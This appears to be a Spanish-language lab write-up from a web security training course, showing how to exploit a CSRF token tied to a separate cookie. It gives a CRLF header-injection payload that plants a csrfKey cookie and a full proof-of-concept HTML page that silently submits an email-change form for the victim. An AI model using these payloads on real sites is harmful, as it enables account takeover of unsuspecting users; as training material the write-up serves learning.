...
Se puede commprobar que no esta full integrado probando lo siguiente: al cambiar la cookie de sesion, nos deslogueara, pero si cambiamos la csrfKey y no nos deslogea, sugiere que no estan correctamente enlazados.  
Podemos entrar en incognito con otra sesion y usar la csrfKey y csrf para probar si funciona.

En un header HTTP podriamos encontrarnos esto (en el ejemplo en el search):  
`Set-Cookie: LastSearchTerm=aaaa; Secure; HttpOnly`  
Lo que podemos utilizar para inyectar cookies si no hay la proteccion debida:  
`/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None`  
Luego bastaria con subir esto a nuestra pagina de ataque y lograriamos nuestro cometido.  
`<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">`  
Quedando al final asi:  
`<html>`  
`  <!-- CSRF PoC - generated by Burp Suite Professional -->`  
`  <body>`  
`    <form action="https://0a21003204c31e218249d49800f800ef.web-security-academy.net/my-account/change-email" method="POST">`  
`      <input type="hidden" name="email" value="123777&#64;gmail&#46;com" />`  
`      <input type="hidden" name="csrf" value="2pjPjMKoeJ3NvbzcW3Rlj2Ley8PIhT2E" />`  
`      <input type="submit" value="Submit request" />`  
`    </form>`  
`    <img src="https://0a21003204c31e218249d49800f800ef.web-security-academy.net/?search=test%0d%0aSet-`Cookie:%20csrfKey=CPZgIxY8svtOgCKOPhuumIYDYENgkbhu%3b%20SameSite=None" onerror="document.forms[0].submit()">`  
`  </body>`  
`</html>`  
